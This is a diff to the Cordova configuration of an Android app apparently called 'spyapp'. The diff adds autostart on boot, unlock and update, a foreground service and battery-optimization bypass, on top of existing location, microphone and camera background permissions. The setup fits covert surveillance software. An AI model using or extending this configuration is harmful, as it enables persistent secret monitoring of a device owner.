@@ -1,4 +1,3 @@
-
 <?xml version='1.0' encoding='utf-8'?>
 <widget id="com.spyapp.spy" version="1.0.1"
     xmlns="http://www.w3.org/ns/widgets"
@@ -28,12 +27,16 @@
     <plugin name="cordova-plugin-android-permissions" />
     <plugin name="cordova-plugin-media" />
     <plugin name="cordova-plugin-background-mode" />
+    <plugin name="cordova-plugin-foreground-service" />
+    <plugin name="cordova-plugin-autostart" />
+    <plugin name="cordova-plugin-battery-status" />
 
     <platform name="android">
+        <!-- الأذونات -->
         <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest">
             <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
-                <!-- أذونات التخزين -->
+                <!-- التخزين -->
                 <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
                 <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
 
@@ -52,16 +55,48 @@
                 <!-- الشبكة -->
                 <uses-permission android:name="android.permission.INTERNET" />
 
-                <!-- الخدمات الأمامية والخلفية -->
+                <!-- خدمات أمامية وخلفية -->
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
 
-                <!-- إذن تجاهل تحسينات البطارية لتشغيل بالخلفية -->
+                <!-- إذن تجاهل تحسينات البطارية -->
                 <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
             </manifest>
+        </edit-config>
+
+        <!-- حل مشكلة android:exported -->
+        <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest/application">
+            <application>
+                <!-- بدء التشغيل التلقائي -->
+                <receiver android:name="com.tonikorin.cordova.plugin.autostart.BootCompletedReceiver"
+                          android:enabled="true"
+                          android:exported="true">
+                    <intent-filter>
+                        <action android:name="android.intent.action.BOOT_COMPLETED" />
+                    </intent-filter>
+                </receiver>
+
+                <!-- تشغيل التطبيق عند استبدال الحزمة -->
+                <receiver android:name="com.tonikorin.cordova.plugin.autostart.PackageReplacedReceiver"
+                          android:enabled="true"
+                          android:exported="true">
+                    <intent-filter>
+                        <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                    </intent-filter>
+                </receiver>
+
+                <!-- تشغيل التطبيق عند فتح الجهاز -->
+                <receiver android:name="com.tonikorin.cordova.plugin.autostart.UserPresentReceiver"
+                          android:enabled="true"
+                          android:exported="true">
+                    <intent-filter>
+                        <action android:name="android.intent.action.USER_PRESENT" />
+                    </intent-filter>
+                </receiver>
+            </application>
         </edit-config>
     </platform>
 </widget>
